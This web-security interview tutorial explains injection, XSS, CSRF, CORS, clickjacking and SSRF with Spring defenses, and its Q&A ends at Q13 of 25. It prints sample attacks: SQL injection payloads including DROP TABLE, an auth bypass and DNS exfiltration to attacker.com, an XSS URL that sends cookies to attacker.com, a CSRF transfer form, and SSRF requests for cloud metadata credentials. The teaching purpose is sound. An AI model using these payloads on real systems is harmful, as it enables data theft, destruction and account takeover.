# 🌐 Web Security Q&A — Every Attack That Will Appear in Your Interview

> *"The web is a battlefield. Every form, every URL parameter, every cookie is a potential entry point for an attacker. XSS, CSRF, SQL Injection — these aren't ancient history. They're happening RIGHT NOW to production systems. The good news? Once you understand HOW these attacks work, preventing them becomes second nature."*

**⏱️ Estimated Time**: 65 minutes | **🎯 Difficulty**: 🟡 Medium | **🔗 Prerequisites**: [Security Fundamentals](./01_Security_Fundamentals_QA.md), [Cryptography Essentials](./02_Cryptography_Essentials_QA.md)

---

## 📋 Table of Contents
1. [The Web Attack Landscape](#-the-web-attack-landscape)
2. [SQL Injection — The King of Exploits](#-sql-injection--the-king-of-exploits)
3. [Cross-Site Scripting (XSS)](#-cross-site-scripting-xss)
4. [Cross-Site Request Forgery (CSRF)](#-cross-site-request-forgery-csrf)
5. [CORS Misconfigurations](#-cors-misconfigurations)
6. [Clickjacking](#-clickjacking)
7. [Server-Side Request Forgery (SSRF)](#-server-side-request-forgery-ssrf)
8. [Security Headers — Your Free Defense Layer](#-security-headers--your-free-defense-layer)
9. [Session Management Security](#-session-management-security)
10. [Gamification: Hack This App](#-gamification-hack-this-app)
11. [Interview Q&A — 25 Must-Know Questions](#-interview-qa--25-must-know-questions)
12. [What's Next](#-whats-next)

---

## 🗺️ The Web Attack Landscape

```
╔══════════════════════════════════════════════════════════════════════╗
║              THE WEB ATTACK FAMILY TREE                               ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  INJECTION ATTACKS (putting bad data where good data should be):     ║
║    ├── SQL Injection        → Manipulate database queries            ║
║    ├── NoSQL Injection      → Manipulate MongoDB/similar queries     ║
║    ├── Command Injection    → Execute OS commands                    ║
║    ├── LDAP Injection       → Manipulate directory queries           ║
║    └── Template Injection   → Execute server-side template code      ║
║                                                                      ║
║  CLIENT-SIDE ATTACKS (targeting the browser/user):                   ║
║    ├── XSS (Reflected)      → Inject script via URL/form            ║
║    ├── XSS (Stored)         → Persist malicious script in DB        ║
║    ├── XSS (DOM-based)      → Manipulate client-side JavaScript     ║
║    ├── CSRF                 → Trick user's browser into requests     ║
║    └── Clickjacking         → Overlay invisible frames              ║
║                                                                      ║
║  SERVER-SIDE ATTACKS (targeting the backend):                        ║
║    ├── SSRF                 → Trick server into internal requests   ║
║    ├── Path Traversal       → Access files outside web root         ║
║    ├── XXE                  → Exploit XML parser to read files      ║
║    └── Deserialization      → Execute code via malicious objects    ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### 🎮 How Common Are These? (Real Stats)

```
OWASP Top 10 in the Wild (2023-2024 breach data):

  🏆 #1 Broken Access Control ████████████████████ 34%
  🥈 #2 Injection (SQLi, XSS) ██████████████████   30%  ← This tutorial!
  🥉 #3 Security Misconfig    ████████████████     27%
       #4 Crypto Failures     ████████████         20%
       #5 SSRF               ███████              12%
       
  💡 Key insight: The top 3 are ALL preventable with proper input 
     validation, access controls, and configuration management.
     These aren't sophisticated attacks — they're basic hygiene failures.
```

---

## 💉 SQL Injection — The King of Exploits

> 🎮 **Analogy**: Imagine a librarian who takes your request slip literally. You write "Find book: Harry Potter" and they search for it. Now you write: "Find book: Harry Potter; ALSO GIVE ME EVERYONE'S LIBRARY CARD." If the librarian blindly follows your request without questioning it, that's SQL injection.

### How It Works

```
NORMAL QUERY:
  User input:  "alice"
  Query built:  SELECT * FROM users WHERE username = 'alice'
  Result:       Alice's record

SQL INJECTION:
  User input:  "' OR '1'='1"
  Query built:  SELECT * FROM users WHERE username = '' OR '1'='1'
  Result:       ALL users' records! (because '1'='1' is always true)

MORE DESTRUCTIVE:
  User input:  "'; DROP TABLE users; --"
  Query built:  SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
  Result:       Entire users table DELETED! 💀
```

### Types of SQL Injection

```
1. CLASSIC (In-band): Results visible directly in response
   ' OR 1=1 --        → Returns all rows
   ' UNION SELECT * FROM credit_cards --  → Leaks another table

2. BLIND (Boolean-based): No direct output, but behavior differs
   ' AND 1=1 --       → Page loads normally (true condition)
   ' AND 1=2 --       → Page shows error (false condition)
   Use to extract data one bit at a time by asking yes/no questions

3. TIME-BASED BLIND: No visible difference, but response time varies
   ' AND SLEEP(5) --  → If page takes 5 seconds, injection worked
   ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
   → If first char of password is 'a', response is delayed

4. OUT-OF-BAND: Exfiltrate data via DNS/HTTP to attacker's server
   ' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--
   → Data appears as DNS query to attacker.com
```

### Prevention — The ONLY Reliable Way

```java
// ❌ TERRIBLE: String concatenation (SQL Injection guaranteed)
String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// ❌ STILL BAD: Even with "sanitization" — there's always a bypass
String sanitized = userInput.replace("'", "''"); // Bypassed with Unicode, encodings

// ✅ CORRECT: Parameterized Queries (Prepared Statements)
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userInput);  // Database treats input as DATA, never as CODE
ResultSet rs = stmt.executeQuery();

// ✅ CORRECT: JPA/Hibernate (parameterized by default)
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// ✅ CORRECT: Spring Data JPA (safe query methods)
userRepository.findByUsername(userInput); // Internally uses parameterized query
```

### 🎮 SQL Injection Challenge

> **Can you exploit this vulnerable code?**

```java
// Vulnerable login endpoint
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    String sql = "SELECT * FROM users WHERE email = '" + req.getEmail() 
                 + "' AND password = '" + req.getPassword() + "'";
    User user = jdbcTemplate.queryForObject(sql, userRowMapper);
    if (user != null) return ResponseEntity.ok("Welcome " + user.getName());
    return ResponseEntity.status(401).body("Invalid credentials");
}
```

<details>
<summary>🔓 Exploit: Login as admin without knowing the password</summary>

**Input**:
```json
{
  "email": "admin@company.com' --",
  "password": "anything"
}
```

**Resulting SQL**:
```sql
SELECT * FROM users WHERE email = 'admin@company.com' --' AND password = 'anything'
```

The `--` comments out everything after it, including the password check!
You just logged in as admin. 🎉 (for the attacker)

**Even scarier**:
```json
{
  "email": "' UNION SELECT id, 'admin', 'admin@co.com', '$2a$12$fake' FROM users WHERE 1=1 --",
  "password": "anything"  
}
```
</details>

---

## 🎭 Cross-Site Scripting (XSS)

> 🎮 **Analogy**: Imagine a community bulletin board where anyone can post notes. An attacker posts a note that says "READ THIS!" but hidden behind it is a mechanism that photographs everyone who reads it and sends copies of their keys (cookies/sessions) to the attacker. That's XSS — injecting malicious script into pages other users view.

### Three Types of XSS

```
┌─────────────────────────────────────────────────────────────────┐
│ TYPE 1: REFLECTED XSS (Non-persistent)                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ Attack flow:                                                     │
│   1. Attacker crafts URL: site.com/search?q=<script>steal()</script>
│   2. Sends URL to victim (phishing email, social media)          │
│   3. Victim clicks → server reflects input in response HTML      │
│   4. Browser executes attacker's script in victim's session      │
│   5. Script steals cookies, tokens, or performs actions           │
│                                                                  │
│ Where to find it: Search bars, error pages, URL parameters       │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ TYPE 2: STORED XSS (Persistent) — MOST DANGEROUS                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ Attack flow:                                                     │
│   1. Attacker posts comment: <script>steal()</script>            │
│   2. Server saves it to database (no sanitization)               │
│   3. Every user who views the page loads the malicious script    │
│   4. Script runs in EACH victim's browser context                │
│   5. Mass credential theft, worm propagation                     │
│                                                                  │
│ Where to find it: Comments, profiles, messages, forum posts      │
│ Famous example: Samy worm (MySpace 2005) — 1M friends in 20 hrs │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ TYPE 3: DOM-BASED XSS (Client-side only)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ Attack flow:                                                     │
│   1. Vulnerable JS reads from URL fragment/parameter             │
│   2. Writes it directly to DOM without encoding                  │
│   3. Script executes in browser — server never sees the payload  │
│                                                                  │
│ Example:                                                         │
│   // page.html — reads hash and writes to DOM                    │
│   document.getElementById('greeting').innerHTML =                │
│       "Hello " + document.location.hash.substring(1);           │
│                                                                  │
│   URL: page.html#<img src=x onerror=alert(document.cookie)>     │
│                                                                  │
│ Where to find it: SPAs, client-side routing, fragment handlers   │
└─────────────────────────────────────────────────────────────────┘
```

### What Can XSS Do?

```
Once attacker's JavaScript runs in victim's browser:

  🍪 Steal session cookies:     document.cookie → sent to attacker
  🔑 Steal tokens:              localStorage.getItem('jwt') → exfiltrated
  📷 Keylog:                    Record everything typed on the page
  🏦 Perform actions:           Transfer money, change password, add admin
  🔄 Spread:                    Self-replicating XSS worm (MySpace Samy)
  📍 Redirect:                  Send user to phishing page
  📸 Screenshot:                Capture screen content

  Basically: attacker can do ANYTHING the victim can do on the site.
```

### Prevention — Defense in Depth

```java
// LAYER 1: Output Encoding (THE primary defense)
// Encode data when rendering in HTML context

// ❌ BAD: Direct output
<p>Welcome, ${username}</p>  // If username = <script>evil()</script> → XSS!

// ✅ GOOD: HTML entity encoding
<p>Welcome, ${fn:escapeXml(username)}</p>  // <script> → &lt;script&gt; (harmless)

// In Thymeleaf (auto-escapes by default):
<p th:text="${username}">Name</p>  // ✅ Escaped
<p th:utext="${username}">Name</p> // ❌ Unescaped! Only for trusted HTML

// In React (auto-escapes by default):
<p>{username}</p>  // ✅ Escaped automatically
<p dangerouslySetInnerHTML={{__html: username}}/>  // ❌ Dangerous! Named as warning
```

```java
// LAYER 2: Input Validation (secondary defense)
public String sanitizeInput(String input) {
    // Allowlist approach — only permit expected characters
    if (!input.matches("[a-zA-Z0-9 .@_-]+")) {
        throw new ValidationException("Invalid characters");
    }
    return input;
}

// LAYER 3: Content Security Policy header (prevents inline scripts)
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
// Even if XSS payload is injected, browser won't execute it without the nonce

// LAYER 4: HttpOnly cookies (prevent JS from reading session cookies)
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
// document.cookie can't read this → XSS can't steal the session
```

### 🎮 XSS Challenge: Exploit & Fix

**Vulnerable code:**
```html
<!-- Server-rendered search results page -->
<h2>Search results for: ${searchQuery}</h2>
<p>Found ${results.size()} results</p>
```

<details>
<summary>🔓 Craft a URL that steals cookies</summary>

**Exploit URL**:
```
https://site.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**What happens**:
1. Server renders: `<h2>Search results for: <script>fetch(...)...</script></h2>`
2. Browser executes the script
3. Victim's cookies sent to attacker's server
4. Attacker uses cookies to hijack session

**Fix**:
```html
<!-- Use proper escaping -->
<h2>Search results for: <c:out value="${searchQuery}"/></h2>
<!-- Or in Thymeleaf -->
<h2 th:text="'Search results for: ' + ${searchQuery}"></h2>
```
</details>

---

## 🎪 Cross-Site Request Forgery (CSRF)

> 🎮 **Analogy**: You're logged into your bank. An attacker sends you a funny cat picture link. You click it. Behind the scenes, the "cat picture" page secretly submits a form to your bank: "Transfer $10,000 to attacker's account." Your browser helpfully attaches your bank session cookie to the request. The bank sees a valid session → processes the transfer. You just got robbed while looking at cats.

### How CSRF Works

```
ATTACK FLOW:

  1. Victim is logged into bank.com (has valid session cookie)
  
  2. Victim visits evil.com (attacker's page with hidden form):
     
     <img src="https://bank.com/transfer?to=attacker&amount=10000" />
     
     or:
     
     <form action="https://bank.com/transfer" method="POST" id="f">
       <input type="hidden" name="to" value="attacker_account"/>
       <input type="hidden" name="amount" value="10000"/>
     </form>
     <script>document.getElementById('f').submit();</script>
     
  3. Browser sends request to bank.com WITH victim's cookies (automatic!)
  
  4. Bank sees valid session → processes transfer
  
  5. Victim has no idea it happened

WHY IT WORKS:
  → Browsers automatically attach cookies to requests for a domain
  → The bank can't tell the difference between a legitimate form submission
    and one triggered by evil.com
```

### CSRF Prevention

```java
// DEFENSE 1: CSRF Token (Synchronizer Token Pattern)
// Server generates random token, includes in form, validates on submit

// Spring Security (enabled by default for form submissions)
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        );
        // For APIs: use csrf.ignoringRequestMatchers("/api/**") 
        // IF using token-based auth (JWT) — APIs don't need CSRF tokens 
        // because they don't use cookies for auth
    }
}

// In HTML form:
<form method="POST" action="/transfer">
    <input type="hidden" name="_csrf" th:value="${_csrf.token}"/>
    <!-- Attacker can't read this token from their domain (SOP) -->
</form>

// DEFENSE 2: SameSite Cookie Attribute
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
// SameSite=Strict: Cookie NOT sent on cross-site requests at all
// SameSite=Lax:    Cookie sent on top-level navigation GET only (default in modern browsers)
// SameSite=None:   Cookie always sent (must use Secure flag)

// DEFENSE 3: Check Origin/Referer header
@Component
public class CsrfOriginFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, ...) {
        if ("POST".equals(req.getMethod())) {
            String origin = req.getHeader("Origin");
            if (origin != null && !origin.equals("https://bank.com")) {
                response.sendError(403, "Cross-origin request blocked");
                return;
            }
        }
        filterChain.doFilter(req, response);
    }
}
```

### 🎮 CSRF vs XSS — Understand the Difference

| Feature | CSRF | XSS |
|---------|------|-----|
| **What** | Trick browser into making unwanted requests | Inject malicious scripts into pages |
| **Exploits** | Browser's automatic cookie attachment | Server's lack of output encoding |
| **Attacker needs** | Victim to visit attacker's page | Vulnerable input/output on target site |
| **Reads data?** | ❌ Can't read responses (SOP blocks it) | ✅ Can read everything on the page |
| **Actions?** | ✅ Can trigger state-changing actions | ✅ Can do anything the user can do |
| **Defense** | CSRF tokens, SameSite cookies | Output encoding, CSP, input validation |
| **JWT APIs?** | ❌ Not vulnerable (no cookies) | ✅ Still vulnerable (can steal tokens) |

---

## 🔄 CORS Misconfigurations

> 🎮 **Analogy**: CORS is like a bouncer at a club who checks IDs. If the bouncer says "everyone's allowed in" (`Access-Control-Allow-Origin: *`), anyone can walk in. If the bouncer checks a guest list (specific origins), only invited guests enter.

### What CORS Actually Is

```
SAME-ORIGIN POLICY (SOP) — browser's default:
  JavaScript on origin A CANNOT read responses from origin B
  
  Origin = scheme + host + port
  https://app.com:443/page  → origin: https://app.com
  
  ✅ Same origin: https://app.com/api and https://app.com/page
  ❌ Different origin: https://app.com and https://api.company.com

CORS — controlled relaxation of SOP:
  Server says: "I allow https://app.com to read my responses"
  
  Header: Access-Control-Allow-Origin: https://app.com
```

### Dangerous CORS Misconfigurations

```java
// ❌ CRITICAL: Wildcard with credentials
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
            .allowedOrigins("*")           // 🚨 Any website can make requests!
            .allowCredentials(true)         // 🚨 WITH user's cookies!
            // Result: Any site can read private user data
    }
}

// ❌ DANGEROUS: Reflecting Origin header without validation
@Override
public void addCorsMappings(CorsRegistry registry) {
    String origin = request.getHeader("Origin");
    registry.addMapping("/**")
        .allowedOrigins(origin)           // 🚨 Reflects whatever attacker sends!
        .allowCredentials(true);
}

// ✅ CORRECT: Explicit allowlist
@Override
public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/api/**")
        .allowedOrigins("https://app.company.com", "https://admin.company.com")
        .allowedMethods("GET", "POST", "PUT", "DELETE")
        .allowedHeaders("Authorization", "Content-Type")
        .allowCredentials(true)
        .maxAge(3600);
}
```

### CORS Preflight — What & Why

```
PREFLIGHT REQUEST (browser sends automatically for "complex" requests):

  Browser → Server:
    OPTIONS /api/data HTTP/1.1
    Origin: https://app.com
    Access-Control-Request-Method: POST
    Access-Control-Request-Headers: Authorization, Content-Type

  Server → Browser:
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://app.com
    Access-Control-Allow-Methods: GET, POST
    Access-Control-Allow-Headers: Authorization, Content-Type
    Access-Control-Max-Age: 3600   ← Cache preflight for 1 hour

  If server doesn't respond correctly → browser BLOCKS the actual request
  
  "Simple" requests (no preflight): GET/HEAD/POST with standard headers
  "Complex" requests (preflight): Custom headers, PUT/DELETE, JSON content-type
```

---

## 🖼️ Clickjacking

> 🎮 **Analogy**: Imagine playing a video game, clicking "START GAME" on screen. But invisible to you, there's a transparent bank transfer confirmation button perfectly overlaid on "START GAME." You clicked the bank button without knowing.

### How It Works

```
CLICKJACKING:

  [What victim sees]          [What's actually there]
  ┌────────────────────┐      ┌────────────────────┐
  │                    │      │ ┌──────────────────┐│
  │  🎮 FREE GAME!    │      │ │ INVISIBLE IFRAME  ││
  │                    │      │ │ (bank.com/transfer)│
  │  [PLAY NOW!]      │  ──▶ │ │ [CONFIRM TRANSFER]││
  │                    │      │ │                   ││
  │                    │      │ └──────────────────┘│
  └────────────────────┘      └────────────────────┘
  
  User thinks they're clicking "PLAY NOW"
  Actually clicking "CONFIRM TRANSFER" on the invisible bank iframe
```

### Prevention

```java
// DEFENSE 1: X-Frame-Options header
@Configuration
public class SecurityHeadersConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .frameOptions(frame -> frame.deny())  // ✅ Can't be framed at all
            // .frameOptions(frame -> frame.sameOrigin())  // Allow same-origin framing only
        );
    }
}

// DEFENSE 2: CSP frame-ancestors (more flexible, modern replacement)
Content-Security-Policy: frame-ancestors 'none'
// Or: frame-ancestors 'self' https://trusted-partner.com

// DEFENSE 3: JavaScript frame-buster (legacy fallback)
<script>
    if (window.top !== window.self) {
        window.top.location = window.self.location; // Break out of frame
    }
</script>
```

---

## 🎯 Server-Side Request Forgery (SSRF)

> 🎮 **Analogy**: You can't enter the restricted area of a military base. But you convince a soldier (the server) to "fetch something" for you from inside the restricted area. The soldier has access — and brings you back classified documents.

### How SSRF Works

```
NORMAL FLOW:
  User → "Fetch https://example.com/image.png" → Server fetches → Returns image

SSRF ATTACK:
  User → "Fetch http://169.254.169.254/latest/meta-data/iam/credentials" → Server fetches → 
  Returns AWS credentials!!! 💀
  
  User → "Fetch http://internal-admin-panel:8080/users" → Server fetches →
  Returns internal admin data!!! 💀

WHY IT'S DEVASTATING:
  → Server is inside the corporate network (trusted)
  → Cloud metadata endpoints (169.254.169.254) expose credentials
  → Internal services often have no authentication (assume trusted network)
  
FAMOUS SSRF BREACHES:
  → Capital One (2019): SSRF on WAF → AWS metadata → S3 credentials → 100M records
  → Shopify (2020): SSRF in Markdown renderer → internal Google Cloud metadata
```

### Prevention

```java
// ❌ VULNERABLE: User-controlled URL fetched by server
@GetMapping("/preview")
public byte[] fetchPreview(@RequestParam String url) {
    return restTemplate.getForObject(url, byte[].class); // 🚨 Attacker controls URL!
}

// ✅ DEFENSE 1: URL allowlist
private static final Set<String> ALLOWED_DOMAINS = Set.of(
    "images.example.com", "cdn.trusted.com"
);

@GetMapping("/preview")
public byte[] fetchPreview(@RequestParam String url) {
    URL parsed = new URL(url);
    if (!ALLOWED_DOMAINS.contains(parsed.getHost())) {
        throw new SecurityException("Domain not allowed");
    }
    // Also verify: no IP addresses, no localhost, no internal ranges
    InetAddress addr = InetAddress.getByName(parsed.getHost());
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress()) {
        throw new SecurityException("Internal addresses blocked");
    }
    return restTemplate.getForObject(url, byte[].class);
}

// ✅ DEFENSE 2: Disable cloud metadata endpoint access
// AWS: IMDSv2 requires a token (PUT request first) — can't be exploited via simple GET SSRF
// Or: iptables rule blocking 169.254.169.254 from application containers

// ✅ DEFENSE 3: Network segmentation
// Application containers should NOT have network access to metadata endpoints
// Use a service mesh with egress policies
```

---

## 🛡️ Security Headers — Your Free Defense Layer

```
╔══════════════════════════════════════════════════════════════════════╗
║  SECURITY HEADERS — 5 minutes to implement, massive impact          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  Strict-Transport-Security: max-age=31536000; includeSubDomains     ║
║    → Forces HTTPS for 1 year, even if user types http://             ║
║                                                                      ║
║  Content-Security-Policy: default-src 'self'; script-src 'self'     ║
║    → Prevents XSS by blocking inline scripts and external sources    ║
║                                                                      ║
║  X-Content-Type-Options: nosniff                                     ║
║    → Prevents browsers from guessing content types (MIME sniffing)   ║
║                                                                      ║
║  X-Frame-Options: DENY                                               ║
║    → Prevents clickjacking (page can't be framed)                   ║
║                                                                      ║
║  Referrer-Policy: strict-origin-when-cross-origin                    ║
║    → Limits information leaked in Referer header                     ║
║                                                                      ║
║  Permissions-Policy: camera=(), microphone=(), geolocation=()       ║
║    → Disables browser features the app doesn't need                  ║
║                                                                      ║
║  X-XSS-Protection: 0                                                 ║
║    → Disable browser's built-in XSS filter (causes more issues)     ║
║    → Use CSP instead (more reliable)                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Spring Boot Implementation

```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(31536000)
                .includeSubDomains(true)
                .preload(true))
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'"))
            .frameOptions(frame -> frame.deny())
            .contentTypeOptions(Customizer.withDefaults())  // nosniff
            .referrerPolicy(referrer -> referrer
                .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
            .permissionsPolicy(permissions -> permissions
                .policy("camera=(), microphone=(), geolocation=()"))
        );
        return http.build();
    }
}
```

---

## 🔐 Session Management Security

### Session Attacks & Defenses

```
ATTACK 1: SESSION FIXATION
  Attacker gets a valid session ID → tricks victim into using it
  → Victim logs in with attacker's session ID
  → Attacker now has an authenticated session
  
  FIX: Regenerate session ID after login
  request.getSession().invalidate(); // Destroy old session
  request.getSession(true);          // Create new session after auth

ATTACK 2: SESSION HIJACKING  
  Attacker steals session cookie (via XSS, network sniffing, malware)
  → Uses stolen cookie to impersonate victim
  
  FIX: HttpOnly + Secure flags, short expiry, IP/device binding

ATTACK 3: SESSION PREDICTION
  Session IDs are sequential or predictable
  → Attacker guesses valid session IDs
  
  FIX: Cryptographically random session IDs (128+ bits of entropy)
```

### Secure Cookie Configuration

```java
// Spring Boot — application.yml
server:
  servlet:
    session:
      cookie:
        http-only: true     # Can't be read by JavaScript (XSS protection)
        secure: true        # Only sent over HTTPS
        same-site: lax      # CSRF protection
        max-age: 1800       # 30 minutes (shorter = safer)
        name: __Host-session # __Host- prefix = must be Secure + path=/
      timeout: 30m          # Server-side session expiry
```

---

## 🎮 Gamification: Hack This App

### 🏰 The Vulnerable E-Commerce Challenge

> **Scenario**: You're a security consultant hired to pen-test an e-commerce app. Find all vulnerabilities in this code:

```java
@RestController
public class ProductController {
    
    @GetMapping("/search")
    public String search(@RequestParam String q, Model model) {
        // Vulnerability 1: ???
        String sql = "SELECT * FROM products WHERE name LIKE '%" + q + "%'";
        List<Product> results = jdbcTemplate.query(sql, productMapper);
        // Vulnerability 2: ???
        model.addAttribute("query", q);  // Rendered as: <h2>Results for: ${query}</h2>
        return "search-results";
    }
    
    @PostMapping("/review")
    public ResponseEntity<?> addReview(@RequestBody ReviewRequest req) {
        // Vulnerability 3: ???
        reviewRepo.save(new Review(req.getProductId(), req.getUserId(), req.getText()));
        return ResponseEntity.ok("Review added");
    }
    
    @GetMapping("/image-proxy")
    public byte[] proxyImage(@RequestParam String imageUrl) {
        // Vulnerability 4: ???
        return restTemplate.getForObject(imageUrl, byte[].class);
    }
}
```

<details>
<summary>🔍 Find all 4+ vulnerabilities (Click to reveal answers)</summary>

| # | Vulnerability | Type | Exploit | Fix |
|---|---|---|---|---|
| 1 | SQL in search query | SQL Injection | `q='; DROP TABLE products; --` | Use `PreparedStatement` with `?` |
| 2 | Unescaped query in HTML | Reflected XSS | `q=<script>steal()</script>` | Use `th:text` (auto-escape) |
| 3 | No auth check on userId | IDOR | Change `userId` to another user | Verify authenticated user matches `userId` |
| 4 | User-controlled URL fetched | SSRF | `imageUrl=http://169.254.169.254/...` | Allowlist domains, block internal IPs |
| 5 | No CSRF protection on POST | CSRF | External form submission | Add CSRF token |
| 6 | No rate limiting | DoS/Scraping | Script 10K requests/sec | Add `@RateLimiter` |

**Bonus**: No input length limits on `q` or `text` → potential ReDoS or buffer overflow
</details>

---

## 🎯 Interview Q&A — 25 Must-Know Questions

### Injection & XSS (Q1-Q10)

**Q1: What is SQL Injection and how do you prevent it?**

> **A**: SQL injection occurs when user input is concatenated into SQL queries, allowing attackers to modify query logic. Prevention: (1) Parameterized queries/prepared statements (treat input as data, never code), (2) ORM frameworks like JPA/Hibernate (parameterized by default), (3) Input validation (allowlist expected characters), (4) Least privilege database users. Parameterized queries are the ONLY reliable defense — sanitization/escaping always has bypasses.

**Q2: What are the three types of XSS? Which is most dangerous?**

> **A**: (1) Reflected: malicious script in URL, executed when victim clicks link. (2) Stored: malicious script saved in database, executed for every viewer — MOST DANGEROUS because it affects all users automatically without needing to trick each one. (3) DOM-based: client-side JavaScript manipulates DOM unsafely. Prevention: output encoding for context (HTML/JS/URL/CSS), CSP headers, HttpOnly cookies.

**Q3: How does Content Security Policy prevent XSS?**

> **A**: CSP tells the browser which sources of content are trusted. `script-src 'self'` means only scripts from the same origin can execute — even if an attacker injects `<script>evil()</script>`, the browser blocks it because inline scripts aren't in the policy. For dynamic scripts, use nonces: `script-src 'nonce-random123'` and `<script nonce="random123">safe()</script>`. CSP is defense-in-depth — it's the last line if output encoding is missed.

**Q4: What is Stored XSS and why is it worse than Reflected XSS?**

> **A**: Stored XSS persists in the database (comments, profiles, messages). Every user who views the page is affected automatically — no phishing needed. Example: attacker posts a comment with `<script>` tag → every visitor's session is compromised. Reflected XSS requires tricking each individual victim into clicking a crafted URL. Stored XSS can create self-propagating worms (Samy worm on MySpace infected 1M accounts in 20 hours).

**Q5: Explain CSRF. Why doesn't it affect API-only backends with JWT?**

> **A**: CSRF exploits the browser's automatic cookie attachment — attacker's site triggers a request to your site, and the browser includes authentication cookies. JWT APIs are typically immune because: (1) JWTs are stored in localStorage/memory and must be explicitly added to headers, (2) browsers don't automatically attach Authorization headers, (3) Without cookies as auth mechanism, CSRF has nothing to exploit. Cookie-based auth IS vulnerable — use CSRF tokens + SameSite attribute.

**Q6: What is SSRF? Describe a real-world impact.**

> **A**: SSRF tricks the server into making requests to unintended destinations (internal services, cloud metadata endpoints). Capital One breach (2019): SSRF vulnerability in a WAF configuration → attacker accessed AWS metadata endpoint (169.254.169.254) → obtained IAM role credentials → accessed S3 buckets → 100M customer records stolen. Prevention: URL allowlisting, block internal IP ranges, use IMDSv2 (requires token), network segmentation.

**Q7: What is the difference between input validation and output encoding?**

> **A**: Input validation checks that data meets expected format BEFORE processing (reject invalid data). Output encoding transforms data to be safe in its render context AFTER processing (HTML encoding, URL encoding, JS encoding). Both are needed: input validation reduces attack surface, output encoding prevents exploitation even if validation is bypassed. Critical: you MUST encode for the correct context — HTML encoding doesn't help in a JavaScript string context.

**Q8: How would you prevent command injection in a Java application?**

> **A**: (1) Never pass user input to `Runtime.exec()` or `ProcessBuilder` directly, (2) If command execution is necessary, use allowlist of permitted commands, (3) Use library functions instead of shell commands (e.g., `Files.copy()` instead of `cp`), (4) If shell unavoidable, use `ProcessBuilder` with argument array (not string concatenation) — each argument is separate, preventing injection: `new ProcessBuilder("ls", "-la", userDir)` — userDir can't inject `;rm -rf /`.

**Q9: What is a parameterized query? Why is it immune to SQL injection?**

> **A**: A parameterized query separates SQL code from data. The database parses the query structure first (with `?` placeholders), THEN binds user input as data values. The input can NEVER be interpreted as SQL code because the query structure is already compiled. Even if input is `'; DROP TABLE users; --`, it's treated as a literal string value being searched for — not as SQL commands.

**Q10: Explain DOM-based XSS. How is it different from server-side XSS?**

> **A**: DOM-based XSS happens entirely in the browser — malicious data never reaches the server. Vulnerable JavaScript reads from an attacker-controllable source (URL fragment, `postMessage`) and writes to a dangerous sink (`innerHTML`, `eval()`, `document.write()`). Difference: server-side XSS is detectable in server logs and WAFs; DOM XSS is invisible to the server. Prevention: use `textContent` instead of `innerHTML`, sanitize client-side with DOMPurify, avoid `eval()`.

### CORS, Headers & Architecture (Q11-Q20)

**Q11: What is CORS? What security problem does it solve?**

> **A**: CORS (Cross-Origin Resource Sharing) is a browser mechanism that prevents JavaScript on one origin from reading responses from another origin. Without it, `evil.com` could make authenticated requests to `bank.com` (using the user's cookies) and read the response (account balance, transaction history). CORS requires the server to explicitly opt-in to cross-origin access via `Access-Control-Allow-Origin`. It protects users from malicious websites stealing their data.

**Q12: What happens if you set `Access-Control-Allow-Origin: *` with credentials?**

> **A**: Browsers will REJECT this combination — the spec forbids `*` with `credentials: true`. However, a dangerous misconfiguration is dynamically reflecting the request's Origin header without validation: effectively `*` but targeted. This allows any website to make credentialed cross-origin requests and read responses. Correct approach: maintain an explicit allowlist of trusted origins and validate against it.

**Q13: What security headers should every web application have?**

> **A**: (1) `Strict-Transport-Security` — force HTTPS, prevent downgrade, (2) `Content-Security-Policy` — prevent XSS, control resource loading, (3) `X-Content-Type-Options: nosniff` — prevent MIME confusion, (4) `X-Frame-Options: DENY` or CSP `frame-ancestors` — prevent clickjacking, (5) `Referrer-Policy` — control information leakage, (6) `Permissions-Policy` — disable unused browser APIs. These are low-effort, high-impact defenses — no excuse not to have them.

